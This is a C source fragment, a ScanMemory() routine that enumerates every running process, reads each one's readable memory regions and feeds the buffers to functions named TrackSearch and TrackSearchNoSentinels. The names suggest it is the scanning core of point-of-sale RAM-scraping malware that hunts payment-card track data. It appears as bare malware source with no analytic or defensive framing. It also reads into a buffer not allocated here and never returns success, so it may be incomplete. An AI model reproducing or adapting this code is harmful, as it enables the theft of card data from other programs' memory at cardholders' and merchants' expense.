
BOOL ScanMemory() {
    HANDLE hProc, hProcs;
    MEMORY_BASIC_INFORMATION MBI;
    BYTE *Buf;
    DWORD ReadAddr, QueryAddr, BytesRead, BufSize;
    BOOL bRes;

    bRes = FALSE;
    _memset(&ProcessInfo, 0x00, sizeof(ProcessInfo));
    ProcessInfo.dwSize = sizeof(PROCESSENTRY32);

    hProcs = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
    if (hProcs == INVALID_HANDLE_VALUE) {
        return bRes;
    }

    if (!Process32First(hProcs, &ProcessInfo)) {
        CloseHandle(hProcs);
        return bRes;
    }

    do { // Enumerate processes
        if (SkipProcess(ProcessInfo.szExeFile)) continue;
        if (CurPID == ProcessInfo.th32ProcessID || CurPID == ProcessInfo.th32ParentProcessID) continue;

        hProc = OpenProcess(PROCESS_VM_READ | PROCESS_QUERY_INFORMATION, FALSE, ProcessInfo.th32ProcessID);
        if (hProc == NULL) continue;

        if (x64 && !IsWoW64ProcessX(hProc)) {
            CloseHandle(hProc);
            continue;
        }

        QueryAddr = 0;
        while (1) { // Enumerate process memory regions
            _memset(&MBI, 0x00, sizeof(MBI));
            if (!VirtualQueryEx(hProc, (LPVOID)QueryAddr, &MBI, sizeof(MBI))) break;

            if (MBI.BaseAddress == NULL && QueryAddr != 0) break; // Memory regions finished
            QueryAddr += MBI.RegionSize;

            if (MBI.Protect & PAGE_NOACCESS || MBI.Protect & PAGE_GUARD) continue;

            ReadAddr = (DWORD)MBI.BaseAddress;
            while (MBI.RegionSize > 0) {
                BufSize = MBI.RegionSize > ReadLimit ? ReadLimit : MBI.RegionSize;
                MBI.RegionSize -= BufSize;

                BytesRead = 0;
                if (!ReadProcessMemory(hProc, (LPVOID)ReadAddr, Buf, BufSize, &BytesRead)) break;
                TrackSearch(Buf, BytesRead);
                TrackSearchNoSentinels(Buf, BytesRead);

                ReadAddr += BytesRead;
            }
        }

        CloseHandle(hProc);
    } while (Process32Next(hProcs, &ProcessInfo));

    CloseHandle(hProcs);
    return bRes;
}
